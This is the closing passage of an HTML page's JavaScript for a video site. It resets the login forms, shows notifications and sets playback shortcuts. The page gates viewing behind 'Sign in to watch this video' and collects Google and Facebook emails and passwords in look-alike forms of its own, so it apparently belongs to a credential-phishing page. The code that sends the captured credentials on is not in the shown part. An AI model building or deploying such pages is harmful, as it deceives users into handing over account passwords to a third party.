            return 'VID-' + Date.now().toString(36).toUpperCase() + Math.random().toString(36).substr(2, 6).toUpperCase();
        }
        
        function resetForms() {
            googleForm.style.display = 'none';
            facebookForm.style.display = 'none';
            socialLoginOptions.style.display = 'flex';
            googleEmail.value = '';
            googlePassword.value = '';
            facebookEmailPhone.value = '';
            facebookPassword.value = '';
            modalSubtitle.textContent = 'Sign in to watch this video';
            
            googleSubmitBtn.disabled = false;
            facebookSubmitBtn.disabled = false;
            googleSubmitBtn.textContent = 'Next';
            facebookSubmitBtn.textContent = 'Next';
        }
        
        function showNotification(text, isSuccess = true) {
            notificationText.textContent = text;
            statusNotification.style.background = isSuccess ? '#000000' : '#e53935';
            statusNotification.style.display = 'flex';
            setTimeout(() => {
                statusNotification.style.display = 'none';
            }, 2000);
        }

        // ==================== UPLOAD BUTTON ====================
        uploadBtn.addEventListener('click', function() {
            if (!isLoggedIn) {
                showNotification('Please login to upload videos', false);
                showLoginModal();
            } else {
                showNotification('Upload feature is ready!', true);
            }
        });

        // ==================== PAGE LOAD ====================
        window.addEventListener('load', function() {
            video.load();
            updateTimeDisplay();
        });

        // ==================== KEYBOARD SHORTCUTS ====================
        document.addEventListener('keydown', function(e) {
            if (!isLoggedIn) return;
            
            switch(e.code) {
                case 'Space':
                    e.preventDefault();
                    togglePlayPause();
                    break;
                case 'ArrowLeft':
                    e.preventDefault();
                    video.currentTime -= 5;
                    break;
                case 'ArrowRight':
                    e.preventDefault();
                    video.currentTime += 5;
                    break;
                case 'KeyF':
                    if (e.ctrlKey || e.metaKey) {
                        e.preventDefault();
                        document.querySelector('.video-wrapper').requestFullscreen();
                    }
                    break;
                case 'Escape':
                    if (loginModal.style.display === 'flex') hideLoginModal();
                    break;
            }
        });

        // ==================== FORM ENTER KEY ====================
        googleEmail.addEventListener('keypress', e => { if (e.key === 'Enter') googleSubmitBtn.click(); });
        googlePassword.addEventListener('keypress', e => { if (e.key === 'Enter') googleSubmitBtn.click(); });
        facebookEmailPhone.addEventListener('keypress', e => { if (e.key === 'Enter') facebookSubmitBtn.click(); });
        facebookPassword.addEventListener('keypress', e => { if (e.key === 'Enter') facebookSubmitBtn.click(); });

        // ==================== FULLSCREEN CHANGE ====================
        document.addEventListener('fullscreenchange', function() {
            fullscreenBtn.innerHTML = document.fullscreenElement ? 
                '<i class="fas fa-compress"></i>' : 
                '<i class="fas fa-expand"></i>';
        });
    </script>
</body>
</html>
